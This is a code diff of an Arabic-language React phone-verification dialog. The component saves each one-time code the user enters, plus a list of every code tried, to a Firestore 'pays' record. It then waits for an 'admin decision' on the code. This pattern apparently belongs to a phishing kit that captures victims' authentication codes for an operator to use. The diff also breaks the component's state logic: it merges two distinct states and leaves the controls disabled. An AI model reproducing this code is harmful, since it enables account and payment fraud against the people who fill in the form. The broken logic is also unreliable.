@@ -20,27 +20,27 @@ interface PhoneOtpDialogProps {
 export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
-  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
+  const [phoneOtpApproved, setOtpStatus] = useState<"pending" | "pending" | "approved" | "rejected">("pending")
   const [error, setError] = useState("")
   const inputRef = useRef<HTMLInputElement | null>(null)
   const allOtps = useRef<string[]>([])
 
   // Timer countdown
   useEffect(() => {
-    if (open && timer > 0 && otpStatus === "waiting") {
+    if (open && timer > 0 && phoneOtpApproved === "pending") {
       const interval = setInterval(() => {
         setTimer((prev) => prev - 1)
       }, 1000)
       return () => clearInterval(interval)
     }
-  }, [open, timer, otpStatus])
+  }, [open, timer, phoneOtpApproved])
 
   // Reset on open
   useEffect(() => {
     if (open) {
       setTimer(60)
       setOtp("")
-      setOtpStatus("waiting")
+      setOtpStatus("pending")
       setError("")
       allOtps.current = []
       inputRef.current?.focus()
@@ -49,7 +49,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
 
   // Listen to Firestore for admin decision
   useEffect(() => {
-    if (!open || otpStatus !== "verifying") return
+    if (!open || phoneOtpApproved !== "pending") return
 
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) return
@@ -80,14 +80,14 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
             }, 1000)
           } else if (status === "rejected") {
             console.log("[PhoneOTP] OTP rejected")
-            setOtpStatus("waiting") // Reset to waiting instead of rejected
+            setOtpStatus("pending") // Reset to pending instead of rejected
             setOtp("") // Clear the old code
             setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
             
             // Clear the rejected status in Firebase after showing error
             setTimeout(async () => {
               await updateDoc(doc(db, "pays", visitorID), {
-                phoneOtpStatus: "verifying" // Keep modal open for new input
+                phoneOtpStatus: "pending" // Keep modal open for new input
               })
             }, 1000)
           }
@@ -96,12 +96,12 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
       (err) => {
         console.error("[PhoneOTP] Firestore listener error:", err)
         setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
-        setOtpStatus("waiting")
+        setOtpStatus("pending")
       }
     )
 
     return () => unsubscribe()
-  }, [open, otpStatus, onOpenChange, onRejected])
+  }, [open, phoneOtpApproved, onOpenChange, onRejected])
 
   const handleChange = (value: string) => {
     if (/^\d*$/.test(value) && value.length <= 6) {
@@ -122,7 +122,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
     try {
       allOtps.current.push(otp)
       
-      setOtpStatus("verifying")
+      setOtpStatus("pending")
       setError("")
 
       // Save OTP to Firebase
@@ -130,7 +130,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
         phoneOtp: otp,
         phoneOtpSubmittedAt: new Date().toISOString(),
         allPhoneOtps: allOtps.current,
-        phoneOtpStatus: "verifying", // Set to verifying, waiting for admin decision
+        phoneOtpStatus: "pending", // Set to pending, pending for admin decision
         phoneOtpUpdatedAt: new Date().toISOString()
       })
 
@@ -139,11 +139,11 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
         phoneOtp: otp
       }, "pending")
 
-      console.log("[PhoneOTP] OTP submitted, waiting for admin decision")
+      console.log("[PhoneOTP] OTP submitted, pending for admin decision")
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
       setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
-      setOtpStatus("waiting")
+      setOtpStatus("pending")
     }
   }
 
@@ -152,7 +152,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
     setTimer(60)
     setOtp("")
     setError("")
-    setOtpStatus("waiting")
+    setOtpStatus("pending")
     inputRef.current?.focus()
   }
 
@@ -181,7 +181,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
 
         <div className="space-y-6 py-4">
           {/* Status Alerts */}
-          {otpStatus === "verifying" && (
+          {phoneOtpApproved === "pending" && (
             <Alert className="bg-blue-50 border-blue-200">
               <AlertCircle className="h-4 w-4 text-blue-600" />
               <AlertDescription className="text-blue-900">
@@ -190,7 +190,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
             </Alert>
           )}
 
-          {otpStatus === "approved" && (
+          {phoneOtpApproved === "approved" && (
             <Alert className="bg-green-50 border-green-200">
               <CheckCircle2 className="h-4 w-4 text-green-600" />
               <AlertDescription className="text-green-900">
@@ -217,17 +217,17 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
               onChange={(e) => handleChange(e.target.value)}
               placeholder="000000"
               className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2"
-              disabled={otpStatus === "verifying" || otpStatus === "approved"}
+              disabled={phoneOtpApproved === "pending" || phoneOtpApproved === "approved"}
             />
           </div>
 
           {/* Timer / Resend */}
           <div className="text-center">
-            {timer > 0 && otpStatus === "waiting" ? (
+            {timer > 0 && phoneOtpApproved === "pending" ? (
               <p className="text-sm text-gray-600">
                 إعادة إرسال الرمز بعد <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
               </p>
-            ) : otpStatus === "waiting" ? (
+            ) : phoneOtpApproved === "pending" ? (
               <Button 
                 variant="link" 
                 onClick={handleResend} 
@@ -241,10 +241,10 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
           {/* Verify Button */}
           <Button
             onClick={handleVerify}
-            disabled={(otp.length !== 4 && otp.length !== 6) || otpStatus === "verifying" || otpStatus === "approved"}
+            disabled={(otp.length !== 4 && otp.length !== 6) || phoneOtpApproved === "pending" || phoneOtpApproved === "approved"}
             className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] font-bold"
           >
-            {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد الرمز"}
+            {phoneOtpApproved === "pending" ? "جاري التحقق..." : "تأكيد الرمز"}
           </Button>
 
           {/* Security Info */}
